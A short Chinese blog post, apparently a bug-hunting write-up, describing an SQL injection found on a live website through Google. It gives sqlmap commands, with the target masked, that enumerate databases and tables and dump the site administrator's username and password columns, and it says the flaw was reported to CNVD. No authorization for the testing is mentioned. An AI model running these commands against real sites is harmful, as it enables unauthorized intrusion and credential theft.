#### 前言

本次实战来源于谷歌搜索引擎。漏洞已经上报CNVD，文章全程打码。本人萌新一枚，大佬勿喷。

## 实战过程

1.打开网站的前台，此时页面是正常显示，在URL头中发现id值。  
![1.png](https://image.3001.net/images/20210601/1622538413_60b5f8ade84b2dffa35ea.png!small)  
2.尝试加入单引号验证是否存在SQL注入漏洞。发现加入单引号后，页面发生了一些变化。  
![2.png](https://image.3001.net/images/20210601/1622538460_60b5f8dc92aed6240694d.png!small)  
3.直接使用我们的SQL注入神器-SqlMap扫描一波数据库。成功扫描出来数据库。  
SqlMap：  
python sqlmap.py -u "http://XXXX.com/about.php?id=1"--delay 2 --batch –dbs  
![3.png](https://image.3001.net/images/20210601/1622538498_60b5f9020111a6266066d.png!small)  
4.继续查看数据库XXX里面的所有表。  
SqlMap：  
python sqlmap.py -u "http://XXXX.com/about.php?id=1"--delay 2 --batch -D XXXX
--tables  
![4.png](https://image.3001.net/images/20210601/1622538518_60b5f91651aeaf371c127.png!small)  
5.查看到了所有的表名，好奇心唆使我查看XXX表里的内容  
![5.png](https://image.3001.net/images/20210601/1622538764_60b5fa0ce424137f2a3f0.png!small)  
6.都到这里了，必须查看里面到底有些啥。这里得到了网站管理员的ZH和MM

SqlMap：  
python sqlmap.py -u "http://XXXX.com/about.php?id=1"--delay 2 --batch -D XXXX
-T XXXX -C admin_name,admin_pass --dump  
![6.png](https://image.3001.net/images/20210601/1622538792_60b5fa28a73570d9e6831.png!small)  
上报CNVD漏洞平台，溜了溜了。

